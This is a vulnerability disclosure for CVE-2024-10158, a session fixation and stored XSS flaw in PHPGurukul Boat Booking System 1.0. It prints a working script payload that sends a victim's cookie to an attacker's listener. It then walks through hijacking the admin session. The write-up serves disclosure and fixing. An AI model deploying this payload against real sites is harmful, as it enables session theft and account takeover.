# Session Fixation vulnerability from phpgurukul Boat Booking System 1.0 
## CVE-2024-10158

> A vulnerability classified as problematic has been found in PHPGurukul Boat Booking System 1.0. Affected is the function session_start. The manipulation with an unknown input leads to a session fixiation vulnerability. CWE is classifying the issue as CWE-384. Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions. This is going to have an impact on integrity.



**Affected Project**: Boat Booking System 1.0

**Official Website**: https://phpgurukul.com/boat-booking-system-using-php-and-mysql/

**Version**: 1.0

**Related Code file**: book-boat.php

## Vulnerability Description

The session is being started (session_start()) without regenerating the session ID after login, which could expose the system to session fixation attacks. An attacker can force a session ID onto a victim and then hijack it after the victim logs in.

**Risk**: If an attacker gets hold of the session ID (via XSS or other means), they could hijack the session and impersonate the user.

**Fix**: After logging in, regenerate the session ID to prevent this attack.

Via injecting `<script>var i=new Image(); i.src="http://10.10.14.12:1234/?cookie="+btoa(document.cookie);</script>` payload to forms in `book-boat.php`, attacker can inject a XSS payload.

When admin user sign in to check on `all-booking.php`, payload will be triggered and admin cookie is forwarded to attacker's netcat listener, which can be used to login as the admin user without needing any credentials. 


## Demonstration

Below is how boat booking system looks like. Let's fill it up with Session Hijacking payload: `<script>var i=new Image(); i.src="http://10.10.14.12:1234/?cookie="+btoa(document.cookie);</script>`

![Screenshot from 2024-10-17 11-57-34](https://github.com/user-attachments/assets/66af02a8-6ef0-4c27-b8f7-beeef3b11454)

We can see that the booking was done successfully:

![Screenshot from 2024-10-17 11-57-45](https://github.com/user-attachments/assets/50d16838-f7e8-4043-befc-3c2cca27d422)

Now, sign in as the admin:

![Screenshot from 2024-10-17 11-58-06](https://github.com/user-attachments/assets/b1e98c53-530f-475d-8ab6-ff2ceee9be4c)

Going to `all-booking.php`, payload is triggered, and attacker's netcat listener intercepts the admin session cookie:

![Screenshot from 2024-10-17 11-58-23](https://github.com/user-attachments/assets/e79d126a-4a8c-4202-a494-b08c0cbc6806)

Using `atob`, this can be decoded to PHPSESSID:

![Screenshot from 2024-10-17 11-59-46](https://github.com/user-attachments/assets/521ffa2f-55d2-45d5-8f15-0f33c58b869d)

Use coookie editor to set the browser cookie to intercepted admin cookie:

![Screenshot from 2024-10-17 12-10-03](https://github.com/user-attachments/assets/5c64497e-cf01-42c3-9792-e38c3eee2d39)

Without needing any admin credentials, attacker is now able to access admin dashboard with admin privilege:

![Screenshot from 2024-10-17 12-00-38](https://github.com/user-attachments/assets/37deba4e-1095-4aea-bc81-ef0a4dabcd3b)


